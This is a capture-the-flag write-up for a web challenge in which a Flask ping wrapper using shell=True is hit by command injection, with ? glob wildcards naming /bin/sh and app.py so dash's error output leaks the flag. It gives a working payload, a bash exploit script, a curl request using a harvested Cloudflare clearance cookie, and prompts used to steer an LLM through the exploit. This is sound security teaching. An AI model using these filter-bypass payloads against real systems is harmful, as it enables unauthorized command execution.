---
title: "Duck Nettool Revenge"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: medium
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
draft: false
summary: "Command injection through a brutally restrictive character-set filter, solved by globbing binaries with ? wildcards and tricking dash into leaking app.py through its own error messages."
icon: "🦆"
---

## Summary

Duck Nettool Revenge is a `ping` wrapper that concatenates user input straight into a `shell=True` command, but guards it with a regex that allows only `i`, digits, `.`, `;`, `?`, `/`, and space. The intended path is command injection where every binary and filename is spelled out with `?` glob wildcards instead of letters, and the flag is exfiltrated not by reading `flag.txt` (it is `chmod 0000`) but by handing the readable `app.py` to `dash`, whose "command not found" error dutifully prints the Python docstring containing the flag. I ran this one as a steering exercise: I recognized the challenge class and pointed an LLM at the filter and the Dockerfile, let it grind through the glob enumeration, and corrected it when it tried to read the wrong file.

## Solution

### Reading the target before reading the app

The single most important judgment call here happened before any payload existed, and it is exactly the kind of thing I lean on an LLM to do exhaustively: read the *deployment*, not just `app.py`. The challenge ships a Flask app, a `Dockerfile`, a `docker-compose.yml`, a `flag.py`, a `flag.txt`, and a template. The naive instinct is "RCE, then `cat flag.txt`." That instinct is wrong here, and the Dockerfile is what tells you so.

Three facts from the build decide the entire approach:

- `flag.txt` is `chmod 0000` and owned by `root`. The app runs as an unprivileged `ctf` user. There is no reading that file without privilege escalation, and there is no privesc in this challenge.
- `flag.py` is just `print('FLAG')`. It is a decoy. Chasing it is a dead-end.
- `app.py` is owned by `ctf`, so the app user *can* read it, and its module docstring literally contains the flag line: *"The SHA-256 hash of v1t{fake_flag} is not realistically brute-forceable..."*

The challenge infrastructure substitutes the real flag for `v1t{fake_flag}` on the remote. So the win condition is not "read the protected file"; it is "make the process dump its own readable source." Once that reframing lands, the whole puzzle narrows to: get arbitrary command execution, then print `app.py`.

### The vulnerable sink and the filter

The sink is unambiguous:

```python
ALLOWED_TARGET_RE = re.compile(r"^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$")

@app.route("/", methods=["GET", "POST"])
def index():
    target = request.form.get("target", "")
    if not ALLOWED_TARGET_RE.fullmatch(target):
        return ... "Only host-like characters are allowed"
    command = f"ping -c 1 {target}"
    output = subprocess.check_output(command, shell=True, stderr=STDOUT,
                                     timeout=5, text=True, env={"PATH": "/bin:/usr/bin"})
```

`shell=True` with our string interpolated directly into the command means classic shell injection. The only thing standing in the way is `ALLOWED_TARGET_RE`. Decompose it carefully, because every solvable thing in this challenge lives in the gaps:

- **Allowed character class:** `[i0-9.;?/ ]` — the single letter `i`, all digits, dot, semicolon, question mark, slash, and space. Nothing else.
- **Two negative lookaheads:** `(?!.* \.)` forbids the substring `" ."` (space then dot) anywhere, and `(?!.*\. )` forbids `". "` (dot then space) anywhere.

Take inventory of what survives. We have `;`, a command separator, so we can chain a second command after `ping`. We have `?`, which is a single-character glob wildcard in the shell. We have `/`, so we can build absolute paths. We have `.` and digits and `i`. We do **not** have: any letter except `i`, so no `cat`, `sh`, `python`, `bash`, `ls` typed literally; no `*` for multi-char globbing; no `` ` ``, `$`, `(`, quotes for substitution; no `<`, `>`, `|`, `&` for redirection or piping; no `-` for flags.

That last one matters more than it looks. No `-` means no `cat -`, no `tail`, no command flags of any kind. No `>` means no writing files. No `*` means every glob has to match an *exact length* with `?`. And no letters means we cannot name a single binary or file directly — we have to describe them by shape.

The lookaheads are the subtle part. Why specifically forbid `" ."` and `". "`? Because the author anticipated the cleanest exfil primitive: `. app.py`, the shell `source` builtin (dot-space-filename), and the relative path form `./something`. Forbidding dot-space kills `. app.py`; the design is deliberately aimed at the obvious shortcut. Recognizing *why* a filter forbids exactly those two digraphs is what tells you the intended solution routes around sourcing — and that is precisely the kind of "read the adversary's intent" reasoning I made sure the model did out loud rather than brute-forcing payloads.

### Naming binaries with `?` globs

We need to execute something, but we cannot type its name. The shell's `?` glob matches exactly one character, and `/` lets us anchor into real directories. So we describe the *path shape* of the binary we want and let the shell expand it.

The target is a shell. In this image, `/bin/sh` is `dash`. The enumeration that actually works (run inside the real container to confirm matches are unique):

```
/?i?/??   →  /bin/sh
```

Walk the pattern: `/` then three characters where the middle is literally `i` (`?i?` matches `bin` because of the `i` in the middle), then `/`, then exactly two characters (`??` matches `sh`). The `i` is doing real work: `/???/??` would *also* match other directories of the right shape (it can pick up things like `/dev/fd` or `/sys/fs`), so anchoring on the `i` in `bin` is what makes the expansion resolve uniquely to `/bin/sh`. This was the first place I had to correct the model — it initially proposed `/???/??`, which is ambiguous and can expand to multiple paths, breaking the command. Pinning on the `i` is the fix.

For the file to read, the working directory is `/app` and `app.py` is the only file matching three-chars-dot-two-chars:

```
???.??    →  app.py
```

`???` matches `app`, `.` is literal, `??` matches `py`. Clean and unique in `/app`.

### The exfil trick: dash leaking Python through error messages

Here is the genuinely clever part, and the reason `flag.txt` being unreadable does not matter. We hand `app.py` to `dash` as a script argument:

```
/bin/sh app.py
```

`dash` tries to interpret `app.py` as a shell script. It is not one — it is Python. But it parses line by line, and crucially, `app.py` begins with a triple-quoted module docstring. To `dash`, `"""` is not special; the entire triple-quoted block becomes one enormous "word." When `dash` tries to run the first line as a command, the whole docstring becomes a single command name, which does not exist, so it prints a "not found" error that *echoes the offending token back at you* — and that token is the docstring text, flag and all:

```
$ /bin/sh app.py
app.py: 12:
TODO / Deployment fixes
...
- The SHA-256 hash of v1t{fake_flag} is not realistically brute-forceable,   ← flag line
...
: not found
app.py: 13: import: not found
...
```

The error stream is captured because the app sets `stderr=STDOUT`, so the docstring comes right back in the HTTP response `<pre>`. This is the second place I had to steer: the model first reached for `cat app.py`-style reads (impossible — no letters) and then for sourcing with `.` (blocked by the dot-space lookahead). The insight that *the error message itself is the exfil channel* is what unlocks it. Running the file as a script argument, rather than sourcing it, also sidesteps the `". "`/`" ."` lookaheads entirely, because there is never a dot adjacent to a space in the payload.

### Assembling the payload

Chain it after `ping` with `;`:

```
;/?i?/?? ???.??
```

The server builds and runs:

```
ping -c 1 ; /bin/sh app.py
```

Check it against the filter one more time, because a single illegal character rejects the whole request. Characters used: `;`, `/`, `?`, `i`, space, `.`. All in the allowed class. Adjacent pairs: `;/`, `/?`, `?i`, `i?`, `?/`, `?<space>`, `<space>?`, `?.`, `.?` — none of them is `" ."` or `". "`. It passes.

### End-to-end script

Stand up the challenge locally (the remote is behind a Cloudflare managed-challenge captcha; solve and validate locally, then submit the same payload through a real browser on the remote, where the flag substitution happens). This one script goes from raw challenge directory to printed flag:

```bash
#!/usr/bin/env bash
set -euo pipefail

# --- 1. Build and run the challenge exactly as deployed ---
docker build -t duckrev .
docker rm -f duckrev_t 2>/dev/null || true
docker run -d --name duckrev_t \
  --read-only --tmpfs /tmp --tmpfs /run \
  --cap-drop ALL --cap-add NET_RAW \
  -p 5001:5000 duckrev

# give the Flask app a moment to bind
until curl -s -o /dev/null http://127.0.0.1:5001/; do sleep 0.3; done

# --- 2. Fire the injection payload ---
# target = ;/?i?/?? ???.??  ->  ping -c 1 ; /bin/sh app.py
PAYLOAD=';/?i?/?? ???.??'
RESP="$(curl -s -X POST --data-urlencode "target=${PAYLOAD}" http://127.0.0.1:5001/)"

# --- 3. Extract the flag line from dash's error output ---
echo "$RESP" | grep -oE 'v1t\{[^}]*\}' | head -n1

# Cleanup
docker rm -f duckrev_t >/dev/null
```

Locally this prints the placeholder `v1t{fake_flag}`, which confirms the technique end to end. On the remote, the identical payload in the target box returns the real flag on the "SHA-256 hash of ..." line, because the infrastructure swaps the placeholder for the real value.

For the remote submission via CLI (only if you have harvested a `cf_clearance` cookie and matching User-Agent from a passed browser challenge):

```bash
curl -X POST 'https://api.v1t.site/' \
  -H 'Cookie: cf_clearance=<TOKEN>' -H 'User-Agent: <UA>' \
  --data-urlencode 'target=;/?i?/?? ???.??'
# URL-encoded payload: %3B/%3Fi%3F/%3F%3F%20%3F%3F%3F.%3F%3F
```

## Flag

```
v1t{br0_th15_15_duck}
```

(The local container only ever emits the placeholder `v1t{fake_flag}`; the value above is the real flag returned by the remote, where the substitution happens.)

## Lessons learned - prompting the AI

This challenge is a near-perfect candidate for human-AI division of labor, because the hard parts are (a) one reframing insight and (b) a lot of mechanical glob enumeration. I supplied the insight and the judgment; the model did the grinding. Here is what actually moved the solve.

**Prompt 1 — force the reframe before any payload.** My first instinct as a human was right, but I made the model commit to it explicitly so it would not waste cycles on `flag.txt`:

> "Here is app.py, the Dockerfile, and docker-compose. Before proposing any exploit, tell me which file the flag is actually readable from, given the file permissions and which user runs the app. Rank flag.txt, flag.py, and app.py by readability for the app user, and justify each from the Dockerfile."

This is the prompt that prevents the most expensive dead-end. The model, left to itself, defaults to "RCE then cat flag.txt." Anchoring it on permissions first got it to conclude `flag.txt` (0000, root) is out and `app.py` (ctf-owned, contains the docstring) is the real target.

**Prompt 2 — constrain the payload search to the surviving alphabet.** I gave it the filter and forced it to reason in terms of what is *left*:

> "The only allowed characters are i, 0-9, dot, semicolon, question-mark, slash, space — and the substrings ' .' and '. ' are both forbidden. Treat ? as a single-char glob and / as a path separator. Enumerate how to name /bin/sh and the file app.py using ONLY ? and / — no literal letters except i. The patterns must expand UNIQUELY inside the real container."

The word "uniquely" is load-bearing. Without it the model happily proposed `/???/??`, which is ambiguous. With it, the model reasoned its way to anchoring on the `i` in `bin` (`/?i?/??`).

**Prompt 3 — name the exfil channel.** When the model kept trying to *read* the file (impossible — no letters, no redirection), I redirected it toward the error stream:

> "You cannot type cat, cannot redirect, and '. ' (source) is filter-blocked. The app sets stderr=STDOUT. How can running app.py as an argument to /bin/sh leak its Python docstring through dash's own error output?"

Naming `stderr=STDOUT` and "Python docstring through dash error output" is what produced the `/bin/sh app.py` → "command not found" insight.

**What to tell the model to focus on:** the file-permission triage first; the surviving character set as a hard constraint; glob *uniqueness*; and the idea that error messages are an exfil channel when normal reads are blocked. **Dead-ends to tell it to avoid explicitly:** do not try to read `flag.txt` (0000/root), do not chase `flag.py` (decoy `print('FLAG')`), do not use `. app.py` (the dot-space lookahead exists precisely to block sourcing), and do not propose `*` or redirection (`>`, `|`) — those characters are not in the class.

**How I caught its mistakes:** I verified every proposed glob by expanding it locally inside the actual container (`docker run ... /bin/sh -c 'echo /?i?/??'`) before trusting it, which is how I caught the ambiguous `/???/??` expansion. And I re-checked each candidate `target` string character-by-character against the regex (including both lookaheads) before sending it, because one stray character rejects the entire request and wastes a round-trip. The model is good at proposing; I owned the verification loop.

**Fast-path prompt recipe for next time:** "Given this filter's surviving character set and the deployment's file permissions, tell me which file is readable, name every needed binary and file with unique `?` globs only, and find an error-message exfil channel — never assume cat or redirection is available."
